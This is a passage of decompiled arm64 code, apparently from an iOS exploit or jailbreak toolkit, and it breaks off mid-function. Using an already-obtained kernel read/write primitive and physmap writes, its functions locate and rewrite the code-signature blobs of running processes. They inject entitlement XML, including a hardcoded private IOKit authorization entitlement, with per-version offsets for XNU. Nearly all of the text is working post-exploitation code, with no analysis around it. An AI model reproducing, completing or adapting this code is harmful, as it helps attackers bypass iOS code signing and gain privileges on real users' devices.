//----- (000000000002BFDC) ----------------------------------------------------
bool __fastcall cfdict_compare_or_merge(const void *a1, const void *a2, uint8_t *a3)
{
  uint64_t result; // x0

  if ( !a3 )
    return (unsigned int)compare_cfdict_entries(a1, a2) == 0;
  if ( (unsigned int)merge_cfdict_entries(a1, a2) )
  {
    *a3 = 0;
    return (unsigned int)compare_cfdict_entries(a1, a2) == 0;
  }
  result = 1;
  *a3 = 1;
  return result;
}

//----- (000000000002C044) ----------------------------------------------------
void *__fastcall cfplist_serialize_xml(CFPropertyListRef propertyList, size_t *a2)
{
  const struct __CFData *v3; // x0
  const struct __CFData *v4; // x19
  size_t Length; // x0
  size_t v6; // x22
  void *v7; // x21
  const UInt8 *BytePtr; // x0
  CFErrorRef error; // [xsp+8h] [xbp-28h] BYREF

  error = 0;
  v3 = CFPropertyListCreateData(kCFAllocatorDefault, propertyList, kCFPropertyListXMLFormat_v1_0, 0, &error);
  if ( v3 )
  {
    v4 = v3;
    Length = CFDataGetLength(v3);
    if ( Length )
    {
      v6 = Length;
      v7 = malloc(Length);
      if ( v7 )
      {
        BytePtr = CFDataGetBytePtr(v4);
        memcpy(v7, BytePtr, v6);
        *a2 = v6;
      }
      goto LABEL_7;
    }
  }
  else
  {
    v4 = error;
    if ( !error )
      return 0;
  }
  v7 = 0;
LABEL_7:
  CFRelease(v4);
  return v7;
}

//----- (000000000002C0F8) ----------------------------------------------------
bool __fastcall csblob_inject_entitlement(struct_krwCtx *krwCtx, unsigned int a2, const char *a3)
{
  int v5; // w26
  uint64_t v6; // x19
  unsigned int *v7; // x0
  unsigned int *v8; // x20
  unsigned int v9; // w28
  unsigned int v10; // w27
  unsigned int v11; // w25
  size_t v12; // x24
  size_t v13; // x23
  __int64 v14; // x8
  __int128 *v15; // x0
  uint32_t *v16; // x22
  uint32_t *v17; // x0
  size_t v18; // x0
  struct csblob_walk_ctx v20; // [xsp+8h] [xbp-B8h] BYREF

  if ( (unsigned int)csblob_read_and_patch(krwCtx, a2, (__int64)&v20) )
  {
    v5 = (krwCtx->flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) != 0 || krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023);
    v7 = csblob_find_entry(&v20, 0, -86111230);
    if ( !v7 )
      goto LABEL_23;
    v8 = v7;
    v9 = v7[5];
    v10 = bswap32(v9);
    if ( a3 )
    {
      v11 = v7[1];
      if ( !v9 || strcmp((const char *)v7 + v10, a3) )
      {
        v12 = bswap32(v11);
        v13 = (unsigned int)strlen(a3) + 1;
        if ( v5 )
        {
          if ( (unsigned int)v13 <= 0x80 )
          {
            v14 = (unsigned int)(v12 - 128);
            v8[5] = bswap32(v14);
            v15 = (__int128 *)((char *)v8 + v14);
            v15[6] = 0u;
            v15[7] = 0u;
            v15[4] = 0u;
            v15[5] = 0u;
            v15[2] = 0u;
            v15[3] = 0u;
            *v15 = 0u;
            v15[1] = 0u;
            strlcpy((char *)v8 + v14, a3, v13);
            v16 = 0;
LABEL_20:
            if ( (unsigned int)csblob_replace_entry(&v20, 0, v8) )
            {
              v6 = (unsigned int)csblob_apply_with_physmap_write(krwCtx, (__int64)&v20) != 0;
              if ( !v16 )
                goto LABEL_26;
              goto LABEL_25;
            }
            v6 = 0;
            if ( v16 )
LABEL_25:
              free(v16);
LABEL_26:
            csblob_free_entry(&v20);
            return v6;
          }
LABEL_23:
          v6 = 0;
          goto LABEL_26;
        }
        v17 = calloc((unsigned int)(v13 + v12), 1u);
        if ( !v17 )
          goto LABEL_23;
        v16 = v17;
        memcpy(v17, v8, v12);
        v16[5] = v11;
        strlcpy((char *)v16 + (unsigned int)v12, a3, v13);
        v16[1] = bswap32(v13 + v12);
        v8 = v16;
LABEL_18:
        if ( v9 != 0 && !v5 )
        {
          v18 = strlen((const char *)v8 + v10);
          bzero((char *)v8 + v10, v18);
        }
        goto LABEL_20;
      }
    }
    else if ( v9 )
    {
      v16 = 0;
      v7[5] = 0;
      goto LABEL_18;
    }
    v6 = 1;
    goto LABEL_26;
  }
  return 0;
}

//----- (000000000002C2F8) ----------------------------------------------------
__int64 __fastcall csblob_read_and_patch(struct_krwCtx *krwCtx, unsigned int a2, __int64 a3)
{
  __int64 result; // x0
  unsigned __int64 xnuVersionPacked; // x22
  unsigned int *v9; // x0
  unsigned int *v10; // x23
  int v11; // w22
  unsigned __int64 v12; // x0
  unsigned __int64 v13; // x21
  __int64 v14; // x21
  __int128 v15; // q1
  __int128 v16; // q1
  __int128 v17; // q0
  int v18; // w27
  unsigned int *v19; // x0
  char *v20; // x23
  char *v21; // x22
  unsigned int *v22; // x0
  char *v23; // x0
  unsigned int v24; // w4
  size_t v25; // x24
  size_t v26; // x26
  char *v27; // x0
  int v28; // w24
  char *v29; // x0
  unsigned int v30; // w1
  int v31; // w2
  CFIndex Length; // x23
  const UInt8 *BytePtr; // x0
  unsigned int *v34; // x0
  unsigned int *v35; // x26
  unsigned int v36; // w28
  size_t v37; // x24
  unsigned int v38; // w27
  char *v39; // x8
  const char *v40; // x25
  uint32_t *v41; // x0
  uint32_t *v42; // x22
  int v43; // w23
  unsigned int *v44; // x0
  int v45; // [xsp+Ch] [xbp-D4h]
  __int128 v46; // [xsp+10h] [xbp-D0h] BYREF
  __int128 v47; // [xsp+20h] [xbp-C0h]
  __int128 v48; // [xsp+30h] [xbp-B0h]
  __int128 v49; // [xsp+40h] [xbp-A0h]
  __int128 v50; // [xsp+50h] [xbp-90h]
  __int128 v51; // [xsp+60h] [xbp-80h]
  __int64 v52; // [xsp+70h] [xbp-70h]
  CFDataRef v53; // [xsp+78h] [xbp-68h] BYREF
  size_t v54; // [xsp+80h] [xbp-60h] BYREF
  char *v55; // [xsp+88h] [xbp-58h] BYREF

  if ( (unsigned int)csblob_chain_walk_offsets(krwCtx, a2, 0, 1u, (__int64)&v46)
    || (result = csblob_chain_walk_offsets(krwCtx, a2, 0, 0, (__int64)&v46), (uint32_t)result) )
  {
    xnuVersionPacked = krwCtx->xnuVersionPacked;
    if ( xnuVersionPacked >= XNU_VERSION_PACKED(7195, 100, 326, 0, 0) && ((krwCtx->flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) != 0 || xnuVersionPacked > XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023)) )
      LOBYTE(v52) = 1;
    if ( *((uint64_t *)&v48 + 1) >> 29 )
    {
      v12 = kread_task_struct(krwCtx, DWORD1(v50));
      if ( v12 )
      {
        v13 = v12;
        if ( (unsigned int)get_csblob_offset_pair(krwCtx, (int *)&v54, (int *)&v53) )
        {
          v14 = v13 + (unsigned int)v53;
          if ( (unsigned int)krw_read_thunk(krwCtx, v14, 8, &v55) )
          {
            if ( *((char **)&v48 + 1) == v55 )
              goto LABEL_24;
            if ( (unsigned int)proc_kread_and_patch_slot(krwCtx, DWORD1(v50), (__int64)v55) )
            {
              v55 = (char *)*((uint64_t *)&v48 + 1);
              if ( (unsigned int)kwrite_with_retry(krwCtx, v14, (__int64)&v55, 8) )
                goto LABEL_24;
            }
          }
        }
      }
      goto LABEL_82;
    }
    v9 = csblob_find_entry((struct csblob_walk_ctx *)&v46, v50, -86111230);
    if ( !v9 )
      goto LABEL_82;
    v10 = v9;
    if ( v9[10] )
      goto LABEL_82;
    v9[10] = 128;
    if ( (krwCtx->flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) == 0 && xnuVersionPacked <= XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) )
    {
LABEL_15:
      v11 = csblob_apply_with_physmap_write(krwCtx, (__int64)&v46);
      csblob_free_entry((struct csblob_walk_ctx *)&v46);
      v52 = 0;
      v50 = 0u;
      v51 = 0u;
      v48 = 0u;
      v49 = 0u;
      v46 = 0u;
      v47 = 0u;
      if ( v11 )
      {
        result = csblob_chain_walk_offsets(krwCtx, a2, 0, 1u, (__int64)&v46);
        if ( !(uint32_t)result )
          return result;
LABEL_24:
        v15 = v51;
        *(__int128 *)(a3 + 64) = v50;
        *(__int128 *)(a3 + 80) = v15;
        *(uint64_t *)(a3 + 96) = v52;
        v16 = v47;
        *(__int128 *)a3 = v46;
        *(__int128 *)(a3 + 16) = v16;
        v17 = v49;
        result = 1;
        *(__int128 *)(a3 + 32) = v48;
        *(__int128 *)(a3 + 48) = v17;
        return result;
      }
      return 0;
    }
    v18 = (unsigned __int8)v52;
    v54 = 0;
    v55 = 0;
    v53 = 0;
    if ( xnuVersionPacked > XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) && !(uint8_t)v52 )
      goto LABEL_82;
    if ( xnuVersionPacked <= XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) )
    {
      v22 = csblob_find_entry((struct csblob_walk_ctx *)&v46, 5, -86085263);
      if ( !v22 )
      {
        if ( v18 )
        {
          v23 = (char *)malloc(0x52u);
          v21 = v23;
          if ( !v23 )
            goto LABEL_59;
          qmemcpy(v23, "<dict><key>com.apple.private.iokit.IOServiceSetAuthorizationID</key><true/></dict>", 82);
          v24 = 82;
        }
        else
        {
          v29 = (char *)malloc(0x7FF8u);
          v21 = v29;
          if ( !v29 )
            goto LABEL_59;
          qmemcpy(v29, "<dict><key>com.apple.private.iokit.IOServiceSetAuthorizationID</key><true/></dict>", 82);
          bzero(v29 + 82, 0x7FA6u);
          v10[10] = 0x8000;
          v24 = 32760;
        }
        if ( !(unsigned int)csblob_alloc_and_insert_entry((struct csblob_walk_ctx *)&v46, 5, 0xFADE7171, v21, v24)
          || !(unsigned int)csblob_repack_entries((struct csblob_walk_ctx *)&v46, 5u) )
        {
          goto LABEL_59;
        }
        goto LABEL_50;
      }
    }
    else
    {
      v19 = csblob_find_entry((struct csblob_walk_ctx *)&v46, 7, -86085262);
      if ( v19 )
      {
        if ( (unsigned int)ce_context_cfdata_transform(
                             (const UInt8 *)v19 + 8,
                             bswap32(v19[1]) - 8LL,
                             "<dict><key>com.apple.private.iokit.IOServiceSetAuthorizationID</key><true/></dict>",
                             &v55,
                             &v54,
                             0) )
        {
          v20 = v55;
          if ( !(unsigned int)csblob_set_entry_data((struct csblob_walk_ctx *)&v46, 7, 0xFADE7172, v55, v54) )
          {
            v21 = 0;
            v28 = 0;
LABEL_61:
            v45 = v18;
            if ( v20 )
              free(v20);
            if ( v21 )
              free(v21);
            if ( !v28 )
              goto LABEL_82;
            v34 = csblob_find_entry((struct csblob_walk_ctx *)&v46, 0, -86111230);
            if ( !v34 )
              goto LABEL_82;
            v35 = v34;
            v36 = v34[1];
            v37 = bswap32(v36);
            v38 = v34[5];
            v39 = (char *)v34 + bswap32(v38);
            v40 = v38 ? v39 : 0LL;
            v41 = calloc((unsigned int)(v37 + 128), 1u);
            if ( !v41 )
              goto LABEL_82;
            v42 = v41;
            memcpy(v41, v35, v37);
            if ( v38 )
            {
              v42[5] = v36;
              if ( strlcpy((char *)v42 + v37, v40, 0x80u) >= 0x80 )
              {
                free(v42);
                goto LABEL_82;
              }
            }
            else
            {
              v42[5] = 0;
            }
            v42[1] = bswap32(v37 + 128);
            v43 = csblob_replace_entry((struct csblob_walk_ctx *)&v46, 0, v42);
            free(v42);
            if ( v43 )
            {
              if ( v45 )
                goto LABEL_15;
              if ( (unsigned int)csblob_apply_with_physmap_write(krwCtx, (__int64)&v46) )
              {
                csblob_free_entry((struct csblob_walk_ctx *)&v46);
                v52 = 0;
                v50 = 0u;
                v51 = 0u;
                v48 = 0u;
                v49 = 0u;
                v46 = 0u;
                v47 = 0u;
                if ( (unsigned int)csblob_chain_walk_offsets(krwCtx, a2, 0, 1u, (__int64)&v46) )
                {
                  v44 = csblob_find_entry((struct csblob_walk_ctx *)&v46, 5, -86085263);
                  if ( v44 )
                  {
                    v44[1] = bswap32(strlen((const char *)v44 + 8) + 8);
                    if ( (unsigned int)csblob_zero_entry_region((struct csblob_walk_ctx *)&v46, 5u, -86085263) )
                    {
                      if ( csblob_find_entry((struct csblob_walk_ctx *)&v46, v50, -86111230) )
                        goto LABEL_15;
                    }
                  }
                }
              }
            }
LABEL_82:
            csblob_free_entry((struct csblob_walk_ctx *)&v46);
            return 0;
          }
          v21 = 0;
          if ( !(unsigned int)csblob_zero_entry_region((struct csblob_walk_ctx *)&v46, 7u, -86085262) )
            goto LABEL_59;
LABEL_52:
          v28 = 1;
LABEL_60:
          v20 = v55;
          goto LABEL_61;
        }
        goto LABEL_58;
      }
      v22 = csblob_find_entry((struct csblob_walk_ctx *)&v46, 5, -86085263);
      if ( !v22 )
      {
        if ( ce_serialize_cfplist(
               (const UInt8 *)"<dict><key>com.apple.private.iokit.IOServiceSetAuthorizationID</key><true/></dict>",
               82,
               (__int64)&v53) )
        {
          Length = CFDataGetLength(v53);
          v21 = (char *)malloc(Length);
          if ( !v21 )
            goto LABEL_59;
          BytePtr = CFDataGetBytePtr(v53);
          memcpy(v21, BytePtr, Length);
          if ( !(unsigned int)csblob_alloc_and_insert_entry((struct csblob_walk_ctx *)&v46, 7, 0xFADE7172, v21, Length)
            || !(unsigned int)csblob_repack_entries((struct csblob_walk_ctx *)&v46, 7u) )
          {
            goto LABEL_59;
          }
          v31 = -86085262;
          v30 = 7;
          goto LABEL_51;
        }
        goto LABEL_58;
      }
    }
    if ( (unsigned int)cfplist_compare_and_serialize(
                         (UInt8 *)v22 + 8,
                         bswap32(v22[1]) - 8LL,
                         (UInt8 *)"<dict><key>com.apple.private.iokit.IOServiceSetAuthorizationID</key><true/></dict>",
                         82,
                         &v55,
                         &v54,
                         0) )
    {
      v25 = v54;
      if ( v18 )
      {
        v21 = v55;
        v55 = 0;
      }
      else
      {
        v26 = (v54 + 32775) & 0xFFFFFFFFFFFFC000LL;
        v27 = (char *)malloc(v26 - 8);
        v21 = v27;
        if ( !v27 )
          goto LABEL_59;
        memcpy(v27, v55, v25);
        bzero(&v21[v25], v26 - 8 - v25);
        v10[10] = v26;
        LODWORD(v25) = v26 - 8;
      }
      if ( !(unsigned int)csblob_set_entry_data((struct csblob_walk_ctx *)&v46, 5, 0xFADE7171, v21, v25) )
        goto LABEL_59;
LABEL_50:
      v30 = 5;
      v31 = -86085263;
LABEL_51:
      if ( (unsigned int)csblob_zero_entry_region((struct csblob_walk_ctx *)&v46, v30, v31) )
        goto LABEL_52;
LABEL_59:
      v28 = 0;
      goto LABEL_60;
    }
LABEL_58:
    v21 = 0;
    goto LABEL_59;
  }
  return result;
}

//----- (000000000002C9B0) ----------------------------------------------------
unsigned int *__fastcall csblob_find_entry(struct csblob_walk_ctx *ctx, int slot, int magic)
{
  if ( !ctx )
    return 0;

  if ( ctx->containerKind == 0 )
  {
    if ( slot )
      return 0;

    unsigned int *blob = (unsigned int *)ctx->container;
    if ( blob && *blob == 34397946 )
      return blob;
    return 0;
  }

  if ( ctx->containerKind != 1 )
    return 0;

  unsigned int *superblob = (unsigned int *)ctx->container;
  uint32_t entryCount = superblob[0];
  if ( !entryCount )
    return 0;

  unsigned int **entry = (unsigned int **)(*((uint64_t *)superblob + 1) + 8LL);
  for ( uint32_t remaining = entryCount; remaining; --remaining, entry += 2 )
  {
    if ( *((uint32_t *)entry - 2) == slot && bswap32(**entry) == magic )
      return *entry;
  }
  return 0;
}

//----- (000000000002CA2C) ----------------------------------------------------
__int64 __fastcall csblob_replace_entry(struct csblob_walk_ctx *ctx, int slot, unsigned int *replacement)
{
  __int64 result; // x0
  __int64 v5; // x20
  uint32_t *v6; // x8

  result = csblob_find_slot_by_pair(ctx, slot, -86111230);
  if ( result )
  {
    v5 = result;
    result = (__int64)csblob_dup_entry(replacement);
    if ( result )
    {
      v6 = *(uint32_t **)(v5 + 8);
      *(uint64_t *)(v5 + 8) = result;
      csblob_bzero_and_free(v6);
      return 1;
    }
  }
  return result;
}

//----- (000000000002CA80) ----------------------------------------------------
__int64 __fastcall csblob_apply_with_physmap_write(struct_krwCtx *krwCtx, __int64 a2)
{
  __int64 result; // x0
  struct csblob_proc_patch_dispatch_args args; // [xsp+8h] [xbp-28h] BYREF

  args.krwCtx = krwCtx;
  args.csblobCtx = (struct csblob_walk_ctx *)a2;
  args.result = 0;
  if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(7195, 100, 326, 0, 0) || krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_MOBILEBACKUP_SANDBOX_PATCHED) )
  {
    csblob_proc_patch_dispatch(&args);
    return args.result;
  }
  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) && krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(7195, 120, 37, 1023, 1023) )
  {
    result = run_callback_with_physmap_write(krwCtx, (__int64)csblob_proc_patch_dispatch, (__int64)&args);
    if ( (uint32_t)result )
      return args.result;
  }
  else
  {
    result = pthread_create_and_join(krwCtx, (__int64)csblob_proc_patch_dispatch, &args);
    if ( (uint32_t)result )
      return args.result;
  }
  return result;
}

//----- (000000000002CB54) ----------------------------------------------------
void __fastcall csblob_free_entry(struct csblob_walk_ctx *ctx)
{
  if ( ctx->containerKind == 0 )
  {
    csblob_bzero_and_free((uint32_t *)ctx->container);
  }
  else if ( ctx->containerKind == 1 )
  {
    csblob_free_array((unsigned int *)ctx->container);
  }
  ctx->container = 0;
  ctx->containerKind = -1;
}

//----- (000000000002CBA4) ----------------------------------------------------
__int64 __fastcall krw_inject_entitlements2_maybe(struct_krwCtx *krwCtx, __int64 task, char *entitlementXml, char a4)
{
  __int64 result; // x0
  unsigned __int64 v9; // x8
  bool v10; // cc
  bool v11; // w27
  int v12; // w24
  unsigned int *v13; // x0
  unsigned int *v14; // x22
  UInt8 *v15; // x23
  unsigned __int64 v16; // x24
  size_t v17; // x0
  bool v18; // w24
  size_t v19; // x4
  const UInt8 *BytePtr; // x22
  unsigned int Length; // w0
  int v22; // w2
  unsigned int v23; // w1
  void *v24; // x22
  unsigned int *v25; // x0
  unsigned int *v26; // x0
  __int64 v27; // x8
  unsigned __int64 v28; // x9
  unsigned __int64 v29; // x8
  size_t v30; // x24
  size_t v31; // x25
  CFDataRef theData; // [xsp+8h] [xbp-D8h] BYREF
  bool v33; // [xsp+17h] [xbp-C9h] BYREF
  size_t __n; // [xsp+18h] [xbp-C8h] BYREF
  void *__src; // [xsp+20h] [xbp-C0h] BYREF
  struct csblob_walk_ctx v36; // [xsp+28h] [xbp-B8h] BYREF

  __src = 0;
  v33 = 0;
  theData = 0;
  result = csblob_read_and_patch(krwCtx, task, (__int64)&v36);
  if ( !(uint32_t)result )
    return result;
  v9 = krwCtx->xnuVersionPacked;
  if ( v9 < XNU_VERSION_PACKED(7195, 100, 326, 0, 0) || ((krwCtx->flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) == 0 ? (v10 = v9 > XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023)) : (v10 = 1), !v10) )
  {
    v12 = 0;
    v11 = (a4 & 1) == 0;
LABEL_12:
    v13 = csblob_find_entry(&v36, 5, -86085263);
    if ( !v13 )
    {
      if ( (krwCtx->flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) == 0 )
      {
        v19 = strlen(entitlementXml);
        if ( v12 )
        {
          if ( ce_serialize_cfplist((const UInt8 *)entitlementXml, v19, (__int64)&theData) )
          {
            BytePtr = CFDataGetBytePtr(theData);
            Length = CFDataGetLength(theData);
            if ( (unsigned int)csblob_alloc_and_insert_entry(&v36, 7, 0xFADE7172, BytePtr, Length) )
            {
              if ( (unsigned int)csblob_repack_entries(&v36, 7u) )
              {
                v22 = -86085262;
                v23 = 7;
                goto LABEL_53;
              }
            }
          }
        }
        else if ( (unsigned int)csblob_alloc_and_insert_entry(&v36, 5, 0xFADE7171, entitlementXml, v19)
               && (unsigned int)csblob_repack_entries(&v36, 5u) )
        {
          goto LABEL_52;
        }
      }
      goto LABEL_56;
    }
    v14 = v13;
    v15 = (UInt8 *)(v13 + 2);
    v16 = bswap32(v13[1]) - 8LL;
    v17 = strlen(entitlementXml);
    if ( !(unsigned int)cfplist_compare_and_serialize(v15, v16, (UInt8 *)entitlementXml, v17, &__src, &__n, &v33) )
      goto LABEL_56;
    if ( !v33 )
      goto LABEL_25;
    if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(8019, 0, 0, 0, 0) || v11 )
    {
LABEL_18:
      v18 = 0;
      goto LABEL_57;
    }
    if ( (unsigned int)kread_task_slot_and_necp_set(krwCtx, (__int64)&v36, task, &v33) )
    {
      if ( v33 )
        goto LABEL_18;
LABEL_25:
      if ( !v36.prefersDerEntitlements && (krwCtx->flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) != 0 )
      {
        v26 = csblob_find_entry(&v36, v36.selectedSlot, -86111230);
        if ( v26 )
        {
          v27 = v26[10];
          if ( (uint32_t)v27 )
          {
            v28 = v27 - 8;
            if ( v27 - 8 < v16 )
              v28 = v16;
            v29 = (v27 & 0x3FFF) != 0 ? v16 : v28;
            v30 = __n;
            v31 = v29 - __n;
            if ( v29 >= __n )
            {
              memcpy(v15, __src, __n);
              bzero((char *)v14 + v30 + 8, v31);
              v14[1] = bswap32(v30 + 8);
              goto LABEL_52;
            }
          }
        }
LABEL_56:
        v18 = 1;
        goto LABEL_57;
      }
      v24 = __src;
      if ( (unsigned int)csblob_set_entry_data(&v36, 5, 0xFADE7171, __src, __n) )
      {
LABEL_52:
        v23 = 5;
        v22 = -86085263;
        goto LABEL_53;
      }
LABEL_69:
      v18 = 1;
      if ( !v24 )
        goto LABEL_59;
      goto LABEL_58;
    }
LABEL_55:
    v11 = 0;
    goto LABEL_56;
  }
  v36.prefersDerEntitlements = 1;
  v11 = (a4 & 1) == 0;
  if ( v9 >= XNU_VERSION_PACKED(8019, 0, 0, 0, 0) && (a4 & 1) != 0 )
  {
    v36.modifiedDerEntitlements = 1;
  }
  else if ( v9 <= XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) )
  {
    v12 = 0;
    goto LABEL_12;
  }
  v25 = csblob_find_entry(&v36, 7, -86085262);
  if ( !v25 )
  {
    v12 = 1;
    goto LABEL_12;
  }
  if ( !(unsigned int)ce_context_cfdata_transform((const UInt8 *)v25 + 8, bswap32(v25[1]) - 8LL, entitlementXml, &__src, &__n, &v33) )
    goto LABEL_56;
  if ( !v33 )
  {
LABEL_67:
    v24 = __src;
    if ( (unsigned int)csblob_set_entry_data(&v36, 7, 0xFADE7172, __src, __n) )
    {
      v23 = 7;
      v22 = -86085262;
LABEL_53:
      if ( (unsigned int)csblob_zero_entry_region(&v36, v23, v22) )
      {
        v18 = (unsigned int)csblob_apply_with_physmap_write(krwCtx, (__int64)&v36) == 0;
        goto LABEL_57;
      }
      goto LABEL_56;
    }
    goto LABEL_69;
  }
  v18 = 0;
  if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(8019, 0, 0, 0, 0) && (a4 & 1) != 0 )
  {
    if ( !(unsigned int)kread_task_slot_and_necp_set(krwCtx, (__int64)&v36, task, &v33) )
      goto LABEL_55;
    if ( v33 )
    {
      v11 = 0;
      goto LABEL_18;
    }
    goto LABEL_67;
  }
LABEL_57:
  v24 = __src;
  if ( __src )
LABEL_58:
    free(v24);
LABEL_59:
  if ( theData )
    CFRelease(theData);
  csblob_free_entry(&v36);
  if ( v18 )
    return 0;
  if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) || v11 )
    return 1;
  return krw_inject_entitlements_maybe(krwCtx, task, entitlementXml);
}

//----- (000000000002D008) ----------------------------------------------------
__int64 __fastcall ce_context_cfdata_transform(const UInt8 *a1, CFIndex a2, char *a3, uint64_t *a4, size_t *a5, uint8_t *a6)
{
  void *v12; // x0
  void *v13; // x19
  __int64 *v14; // x0
  __int64 v15; // x20
  __int64 *v16; // x0
  __int64 v17; // x28
  __int64 (__fastcall *v18)(__int64, CFDataRef, __int64 *); // x0
  __int64 (__fastcall *v19)(__int64, CFDataRef, __int64 *); // x27
  __int64 (__fastcall *v20)(__int64, CFDictionaryRef *); // x0
  __int64 (__fastcall *v21)(__int64, CFDictionaryRef *); // x28
  __int64 (__fastcall *v22)(__int64, CFMutableDictionaryRef, CFDataRef *); // x0
  void (__fastcall *v23)(__int64 *); // x20
  CFDataRef v24; // x21
  CFMutableDictionaryRef MutableCopy; // x23
  size_t v26; // x0
  CFErrorRef v27; // x25
  size_t Length; // x26
  void *v29; // x0
  void *v30; // x27
  const UInt8 *BytePtr; // x0
  __int64 v32; // x22
  __int64 (__fastcall *v34)(__int64, CFMutableDictionaryRef, CFDataRef *); // [xsp+10h] [xbp-80h]
  __int64 v35; // [xsp+18h] [xbp-78h]
  __int64 v36; // [xsp+20h] [xbp-70h]
  __int64 v37; // [xsp+28h] [xbp-68h] BYREF
  CFDictionaryRef theDict; // [xsp+30h] [xbp-60h] BYREF
  CFDataRef theData; // [xsp+38h] [xbp-58h] BYREF

  theDict = 0;
  theData = 0;
  v37 = 0;
  v12 = dlopen("/usr/lib/libCoreEntitlements.dylib", 1);
  v13 = v12;
  if ( !v12 )
    goto LABEL_18;
  v14 = (__int64 *)dlsym(v12, "kCENoError");
  if ( !v14 )
    goto LABEL_18;
  v15 = *v14;
  v16 = (__int64 *)dlsym(v13, "CECRuntime");
  if ( !v16
    || (v17 = *v16,
        (v18 = (__int64 (__fastcall *)(__int64, CFDataRef, __int64 *))dlsym(v13, "CEManagedContextFromCFData")) == 0)
    || (v19 = v18,
        v36 = v17,
        (v20 = (__int64 (__fastcall *)(__int64, CFDictionaryRef *))dlsym(v13, "CEQueryContextToCFDictionary")) == 0)
    || (v21 = v20,
        (v22 = (__int64 (__fastcall *)(__int64, CFMutableDictionaryRef, CFDataRef *))dlsym(
                                                                                       v13,
                                                                                       "CESerializeCFDictionary")) == 0) )
  {
LABEL_18:
    v24 = 0;
    MutableCopy = 0;
    v27 = 0;
    v23 = 0;
    goto LABEL_19;
  }
  v34 = v22;
  v35 = v15;
  v23 = (void (__fastcall *)(__int64 *))dlsym(v13, "CEReleaseManagedContext");
  if ( !v23 || !dlsym(v13, "CEGetErrorString") )
  {
    v24 = 0;
LABEL_36:
    MutableCopy = 0;
    goto LABEL_37;
  }
  v24 = CFDataCreateWithBytesNoCopy(kCFAllocatorDefault, a1, a2, kCFAllocatorNull);
  if ( !v24 || v35 != v19(v36, v24, &v37) || v35 != v21(v37, &theDict) )
    goto LABEL_36;
  MutableCopy = CFDictionaryCreateMutableCopy(kCFAllocatorDefault, 0, theDict);
  if ( !MutableCopy )
  {
LABEL_37:
    v27 = 0;
    goto LABEL_19;
  }
  v26 = strlen(a3);
  v27 = cfplist_from_bytes((UInt8 *)a3, v26);
  if ( v27 )
  {
    if ( cfdict_compare_or_merge(MutableCopy, v27, a6) && v35 == v34(v36, MutableCopy, &theData) )
    {
      Length = CFDataGetLength(theData);
      v29 = malloc(Length);
      if ( v29 )
      {
        v30 = v29;
        BytePtr = CFDataGetBytePtr(theData);
        memcpy(v30, BytePtr, Length);
        *a4 = v30;
        *a5 = Length;
        v32 = 1;
        goto LABEL_20;
      }
    }
  }
LABEL_19:
  v32 = 0;
LABEL_20:
  if ( theData )
    CFRelease(theData);
  if ( v27 )
    CFRelease(v27);
  if ( MutableCopy )
    CFRelease(MutableCopy);
  if ( theDict )
    CFRelease(theDict);
  if ( v37 )
    v23(&v37);
  if ( v24 )
    CFRelease(v24);
  if ( v13 )
    dlclose(v13);
  return v32;
}

//----- (000000000002D2B4) ----------------------------------------------------
__int64 __fastcall kread_task_slot_and_necp_set(struct_krwCtx *krwCtx, __int64 a2, unsigned int a3, bool *a4)
{
  unsigned __int64 xnuVersionPacked; // x8
  __int64 v8; // x11
  __int64 v9; // x13
  __int64 v10; // x8
  __int64 result; // x0
  unsigned __int64 v12; // [xsp+8h] [xbp-28h] BYREF

  xnuVersionPacked = krwCtx->xnuVersionPacked;
  v8 = 168;
  v9 = 144;
  if ( xnuVersionPacked > XNU_VERSION_PACKED(7195, 100, 325, 1023, 1023) )
    v9 = 152;
  if ( xnuVersionPacked <= XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) )
    v8 = v9;
  if ( xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
    v10 = v8;
  else
    v10 = 160;
  result = kread_physmap_decorated(krwCtx, *(uint64_t *)(a2 + 8) + v10, &v12);
  if ( (uint32_t)result )
  {
    result = necp_set_opt_string_6(krwCtx, a3);
    if ( (uint32_t)result )
    {
      *a4 = v12 == krwCtx->gap_0x390;
      return 1;
    }
  }
  return result;
}

//----- (000000000002D374) ----------------------------------------------------
uint32_t *__fastcall csblob_set_entry_data(struct csblob_walk_ctx *ctx, int slot, unsigned int magic, const void *data, unsigned int size)
{
  uint32_t *result; // x0
  uint32_t *v9; // x20
  uint32_t *v10; // x23
  uint32_t *v11; // x0

  result = (uint32_t *)csblob_find_slot_by_pair(ctx, slot, magic);
  if ( result )
  {
    v9 = result;
    result = malloc(size + 8LL);
    if ( result )
    {
      v10 = result;
      *result = bswap32(magic);
      result[1] = bswap32(size + 8);
      memcpy(result + 2, data, size);
      v11 = (uint32_t *)*((uint64_t *)v9 + 1);
      *((uint64_t *)v9 + 1) = v10;
      csblob_bzero_and_free(v11);
      return &def_3E8F0 + 1;
    }
  }
  return result;
}
// 0: using guessed type int def_3E8F0;

//----- (000000000002D3F8) ----------------------------------------------------
__int64 __fastcall csblob_zero_entry_region(struct csblob_walk_ctx *ctx, unsigned int slot, int magic)
{
  unsigned int *v5; // x20
  __int64 result; // x0
